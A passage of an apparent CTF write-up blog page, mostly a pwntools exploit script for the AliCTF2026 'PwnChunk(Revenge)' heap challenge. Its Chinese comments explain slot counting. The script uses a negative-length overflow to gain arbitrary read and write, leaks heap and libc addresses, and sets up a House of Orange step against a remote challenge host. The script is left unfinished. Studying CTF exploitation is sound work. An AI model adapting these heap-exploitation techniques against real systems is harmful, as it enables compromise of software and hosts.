class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> optparse <span class="hljs-keyword">import</span> OptionParser<br><br>parser = OptionParser() <br>parser.add_option(<span class="hljs-string">&quot;-m&quot;</span>, <span class="hljs-string">&quot;--mode&quot;</span>, dest=<span class="hljs-string">&quot;mode&quot;</span>, default=<span class="hljs-string">&quot;local&quot;</span>)   <br>(options, args) = parser.parse_args()<br><br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;amd64&quot;</span>)<br>context.terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br>targetELF=<span class="hljs-string">&quot;./pwn&quot;</span><br>elf=ELF(targetELF,checksec=<span class="hljs-literal">False</span>)<br>master_idx=<span class="hljs-number">16</span><br>slave_idx=<span class="hljs-number">6</span><br>libc=ELF(<span class="hljs-string">&quot;/home/k40/Pwn/Tools/glibc-all-in-one/libs/2.35-0ubuntu3.12_amd64/libc.so.6&quot;</span>,checksec=<span class="hljs-literal">False</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Launch</span>():<br>    <span class="hljs-keyword">if</span> options.mode==<span class="hljs-string">&quot;local&quot;</span>:<br>        io=process(targetELF)<br>    <span class="hljs-keyword">elif</span> options.mode==<span class="hljs-string">&quot;remote&quot;</span>:<br>        io=remote(<span class="hljs-string">&quot;1.95.148.179&quot;</span>,<span class="hljs-number">8888</span>)<br>    <span class="hljs-keyword">elif</span> options.mode==<span class="hljs-string">&quot;debug&quot;</span>:<br>        context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>        io=gdb.debug(targetELF,gdbscript=<span class="hljs-string">&quot;source ./debug.gdb&quot;</span>)<br>    <span class="hljs-keyword">return</span> io<br><br><span class="hljs-comment">#slot，从0-15轮转</span><br><span class="hljs-comment">#创建一个user, slot+2</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">AddUser</span>(<span class="hljs-params">io,user_name_=<span class="hljs-string">b&quot;root&quot;</span>,email_=<span class="hljs-string">b&quot;mamba_out@ali.com&quot;</span>,age_=<span class="hljs-number">104</span>,bio_len_=<span class="hljs-number">77</span>,bio_=<span class="hljs-string">b&quot;1234567890&quot;</span>*<span class="hljs-number">5</span></span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;选择功能: &quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;用户名: &quot;</span>,user_name_)<br>    io.sendlineafter(<span class="hljs-string">&quot;邮箱: &quot;</span>,email_)<br>    io.sendlineafter(<span class="hljs-string">&quot;年龄: &quot;</span>,<span class="hljs-built_in">str</span>(age_).encode()+<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;个人简介长度: &quot;</span>,<span class="hljs-built_in">str</span>(bio_len_).encode()+<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    <span class="hljs-keyword">if</span> bio_!=<span class="hljs-string">b&quot;I don&#x27;t want bio,just padding&quot;</span>:<br>        io.sendlineafter(<span class="hljs-string">&quot;个人简介: &quot;</span>,bio_)<br>        io.recvuntil(<span class="hljs-string">&quot;[+] 用户信息创建成功&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">DeleteUser</span>(<span class="hljs-params">io</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;选择功能: &quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&quot;[+] 用户信息删除成功&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ShowUser</span>(<span class="hljs-params">io</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;选择功能: &quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&quot;=== 显示用户信息 ===&quot;</span>)<br>    io.recvuntil(<span class="hljs-string">&quot;用户名: &quot;</span>)<br>    user_name_=io.recvline(keepends=<span class="hljs-literal">False</span>)<br>    io.recvuntil(<span class="hljs-string">&quot;邮箱: &quot;</span>)<br>    email_=io.recvline(keepends=<span class="hljs-literal">False</span>)<br>    io.recvuntil(<span class="hljs-string">&quot;年龄: &quot;</span>)<br>    age_=io.recvline(keepends=<span class="hljs-literal">False</span>)<br>    io.recvuntil(<span class="hljs-string">&quot;个人简介: &quot;</span>)<br>    bio_=io.recvline(keepends=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">return</span> user_name_,email_,age_,bio_<br><span class="hljs-comment">#发一次message, slot+3</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">AddMessage</span>(<span class="hljs-params">io,title_len_,title_,content_len_,content_</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;选择功能: &quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;留言标题长度: &quot;</span>,<span class="hljs-built_in">str</span>(title_len_).encode()+<span class="hljs-string">b&#x27;\x00&#x27;</span>)  <span class="hljs-comment">#必定会执行的：添加评论结构体，slot+1</span><br>    <span class="hljs-keyword">if</span> title_!=<span class="hljs-string">b&quot;I don&#x27;t want title,just padding&quot;</span>: <span class="hljs-comment">#真的添加标题，slot+1</span><br>        io.sendlineafter(<span class="hljs-string">&quot;留言标题: &quot;</span>,title_)<br>    io.sendlineafter(<span class="hljs-string">&quot;留言内容长度: &quot;</span>,<span class="hljs-built_in">str</span>(content_len_).encode()+<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    <span class="hljs-keyword">if</span> content_!=<span class="hljs-string">b&quot;I don&#x27;t want content,just padding&quot;</span>:   <span class="hljs-comment">#真的添加内容：slot+1</span><br>        io.sendlineafter(<span class="hljs-string">&quot;留言内容: &quot;</span>,content_)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ShowMessage</span>(<span class="hljs-params">io</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;选择功能: &quot;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&quot;=== 显示留言 ===&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">EditMessage</span>(<span class="hljs-params">io,idx_,new_title_=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">8</span>,new_content_=<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">8</span></span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;选择功能: &quot;</span>,<span class="hljs-string">b&#x27;7&#x27;</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&quot;输入要编辑的留言编号 (1-&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;): &quot;</span>,<span class="hljs-built_in">str</span>(idx_).encode()+<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;输入新的标题: &quot;</span>,new_title_)<br>    io.sendlineafter(<span class="hljs-string">&quot;输入新的内容: &quot;</span>,new_content_)<br>    io.recvuntil(<span class="hljs-string">&quot;[+] 留言编辑成功&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ArbiRead</span>(<span class="hljs-params">io,target_</span>):<br>    EditMessage(io,master_idx,new_title_=p64(target_))<br>    ShowMessage(io)<br>    io.recvuntil(<span class="hljs-string">&quot;--- 留言 6 ---&quot;</span>)<br>    io.recvuntil(<span class="hljs-string">&quot;标题: &quot;</span>)<br>    <span class="hljs-keyword">return</span> io.recvline(keepends=<span class="hljs-literal">False</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ArbiWrite</span>(<span class="hljs-params">io,target_,value_</span>):<br>    EditMessage(io,master_idx,new_title_=p64(target_))<br>    EditMessage(io,slave_idx,new_title_=value_)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ExitPwn</span>(<span class="hljs-params">io</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;选择功能: &quot;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&quot;[+] 感谢使用，再见！&quot;</span>)<br>    io.interactive()<br><br>io=Launch()<br>AddUser(io)<span class="hljs-comment">#开始2次</span><br><span class="hljs-comment">#溢出触发有条件：slot不能为空，arena不能为空，这里申请一堆16次、20次，只是为了-2能触发漏洞</span><br><span class="hljs-comment">#具体怎么凑到的：16次单申请，slot+16，15次三个三个申请，16+15*3=61</span><br><span class="hljs-comment">#在申请第16个评论的标题之前，一共有2（开始2次）+61+2（2次扩容，开始1次，content10的时候1次）+1=66次</span><br><span class="hljs-comment">#66%16=2，所以第16个评论的标题在申请时，slot在第2个arena</span><br><span class="hljs-comment">#第6个评论本身：2（开始的2次）+1（开始的1次扩容）+16+5*3+1=34，34%16=2，所以第6个评论的结构体在申请时，slot在第2个arena</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):  <br>    AddMessage(io,title_len_=<span class="hljs-number">0x9000</span>,title_=<span class="hljs-string">b&quot;I don&#x27;t want title,just padding&quot;</span>,content_len_=<span class="hljs-number">0x9000</span>,content_=<span class="hljs-string">b&quot;I don&#x27;t want content,just padding&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>): <span class="hljs-comment">#一通操作确保第16个评论的title和第6个评论的结构体申请到接近的位置（仅地址的最低字节不同）</span><br>    <span class="hljs-comment">#其中第11次发送留言时，会先扩容，此时原来的留言数组free后是放在第三个slot里合并</span><br>    <span class="hljs-comment">#算下此时的slot下标：2+1+16+10*3=49，49%16=1，第1个arena</span><br>    <span class="hljs-comment">#刚好前面算好了第16个留言本身在第1个arena，只要后面溢出的堆块是这次扩容出来的（记为master_chunk），就能任意写第16个留言本身</span><br>    AddMessage(io,title_len_=<span class="hljs-number">0x100</span>,title_=<span class="hljs-string">b&quot;0x100_title&quot;</span>+<span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>).encode(),content_len_=<span class="hljs-number">0x100</span>,content_=<span class="hljs-string">b&quot;0x100_content&quot;</span>+<span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>).encode())<br><span class="hljs-comment">#上面的事情干完后，这里填bio_len_=-2已经可以触发溢出了，接下来，想办法在DeleteUser时，申请到第6个评论的前面某个位置</span><br>DeleteUser(io) <span class="hljs-comment">#仅置0，对管理器状态无影响</span><br>AddUser(io,bio_len_=<span class="hljs-number">0</span>,bio_=<span class="hljs-string">b&quot;I don&#x27;t want bio,just padding&quot;</span>) <span class="hljs-comment">#slot+1</span><br>AddMessage(io,title_len_=<span class="hljs-number">0x100</span>,title_=<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">16</span>,content_len_=<span class="hljs-number">0x100</span>,content_=<span class="hljs-string">b&#x27;2&#x27;</span>*<span class="hljs-number">0x10</span>) <span class="hljs-comment">#slot+4，也是该步骤free掉了master_chunk</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>): <span class="hljs-comment">#为了控制slot，+11次</span><br>    AddMessage(io,title_len_=<span class="hljs-number">0x9000</span>,title_=<span class="hljs-string">b&quot;I don&#x27;t want title,just padding&quot;</span>,content_len_=<span class="hljs-number">0x9000</span>,content_=<span class="hljs-string">b&quot;I don&#x27;t want content,just padding&quot;</span>)<br>DeleteUser(io)<br><span class="hljs-comment">#开头2次申请，1次扩容，16+20*3=76次申请，20次申请中有1次扩容，1+4+11=16，总共2+1+76+1+16+1=97,97%16=1，在第1个arena；</span><br><span class="hljs-comment">#申请到了master_chunk</span><br>AddUser(io,bio_len_=-<span class="hljs-number">2</span>,bio_=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0xa8</span>+p32(<span class="hljs-number">0x50</span>)+p32(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+<span class="hljs-string">b&#x27;N&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">b&#x27;\x68&#x27;</span>)<br>ShowMessage(io)<br>io.recvuntil(<span class="hljs-string">b&#x27;N&#x27;</span>*<span class="hljs-number">0x20</span>)<br>heap_leak=u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x20468</span><br>log.success(<span class="hljs-string">&quot;heap=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(heap_leak)))<br>io.interactive()<br><br>top_chunk=heap_leak+<span class="hljs-number">0x100790</span><br>ArbiWrite(io,top_chunk+<span class="hljs-number">8</span>,<span class="hljs-number">0x871</span>)  <span class="hljs-comment">#House of Orange</span><br>DeleteUser(io)<br>AddUser(io,bio_len_=<span class="hljs-number">0xffa0</span>,bio_=<span class="hljs-string">b&quot;A\n&quot;</span>)<br>libc.address=u64(ArbiRead(io,top_chunk+<span class="hljs-number">0x10</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x21ace0</span><br>log.success(<span class="hljs-string">&quot;libc_base=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc.address)))<br><br>pop_rdi_ret=libc.address+<span class="hljs-number">0x2a3e5</span><br>ret_align_pad=libc.address+<span class="hljs-number">0x29139</span><br>ExitPwn(io)<br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="category-chain-item">pwn刷题记录</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/" class="category-chain-item">比赛题解</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>AliCTF2026-PwnChunk(Revenge)</div>
+      <div>http://0x4a-210.github.io/2026/02/19/pwn刷题记录/比赛题解/AliCTF2026-PwnChunk(Revenge)/</div>
+    </div>
+    <div class="license-meta">
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>February 19, 2026</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/12/22/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-HKCERT-compress/" title="2025-HKCERT-compress">
+                        <span class="hidden-mobile">2025-HKCERT-compress</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
